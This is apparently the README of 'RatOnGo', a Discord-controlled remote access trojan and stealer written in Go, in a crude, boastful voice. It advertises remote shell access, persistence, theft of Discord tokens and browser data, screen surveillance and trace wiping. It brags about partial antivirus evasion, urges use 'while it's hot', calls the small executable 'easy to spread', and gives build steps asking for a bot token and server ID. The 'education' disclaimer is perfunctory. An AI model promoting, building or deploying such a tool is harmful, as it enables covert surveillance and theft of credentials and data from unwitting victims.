# RatOnGo 😈 (BETA)
Your new favorite Discord RAT & Stealer. Made with Go so it's small, fast, and doesn't eat all the RAM.

**This is a BETA version.** It means it works, but I might add more evil shit later. Or maybe I'll get bored and abandon it. Who knows.

## ⚠️ Don't Be A Dumbass (Disclaimer)
This is for "education". If you get your ass thrown in jail for using this on your school's computers, that's 100% on you. I just write code.

## 🔥 Features
- **Remote Shell:** Full `cmd` and `powershell` access.
- **Discord C2:** Control everything from a Discord server. No shitty panels.
- **Persistence:** Tries its best to stay alive after a reboot.
- **Data Stealing:** Grabs Discord tokens and browser data.
- **Live Surveillance:** `!screen` command to see what they see.
- **Self-Destruct:** `!exit` command to wipe all traces.
- **🔥 TINY:** The final `.exe` is **under 3MB**. Easy to spread.

## 🤔 Is It FUD? (Detection Status)
Let's be real. No public tool stays FUD forever.

*   **Right now? It's SEMI-FUD.** It shits on a lot of basic AVs.
*   **In 2 weeks? It'll be flagged to hell.** Once this gets a few stars, security nerds will write signatures for it.

So yeah, **use it while it's hot.**

## 🛠️ How to Build (It's Fucking Easy)
I made it impossible for you to fuck this up.

1.  **Install Go.** If you don't know how, google it. [Here's a link, lazy ass.](https://golang.org/dl/)
2.  **Run the Builder.**
    *   Just double-click `build.bat`. Everything else is included in the repo.
    *   It will ask for your **Bot Token** and **Server ID**. Don't fuck it up. Paste them and press Enter.
3.  **Done.**
    *   Look for `RatOnGo.exe`. That's your new toy.
